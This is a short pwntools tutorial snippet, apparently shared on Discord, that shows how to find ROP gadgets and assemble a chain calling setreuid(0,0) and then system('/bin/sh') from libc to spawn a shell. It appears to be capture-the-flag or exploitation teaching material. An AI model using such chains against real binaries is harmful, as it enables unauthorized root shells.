# by anvbis: https://discord.com/channels/750635557666816031/900897008414494842/901355781713182740

elf = ELF('./target')
rop = ROP(elf)

# searching for specific gadgets
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
syscall = rop.find_gadget(['syscall', 'ret']).address

# storing specific values in a rop chain
rop.raw(pop_rax)
rop.raw(59)
rop.raw(syscall)

# if you know the binary contains `pop rdi`, `pop rsi` gadgets, etc
# you can just use `call` and pwntools will generate the instructions
# e.g. 
# pop rdi; ret
# 0xdeadbeef
# puts
rop.call(elf.sym.puts, [0xdeadbeef])

# you can search for strings with the elf objects too
libc = ELF('./libc.so.6')
bin_sh = next(libc.search(b'/bin/sh'))

# combining all of these together you can do some pretty interesting stuff
rop.call(libc.sym.setreuid, [0, 0])
rop.call(libc.sym.system, [next(libc.search(b'/bin/sh'))])

# generating the bytecode
rop.chain()

# maybe you want to print it for debugging?
print(rop.dump())
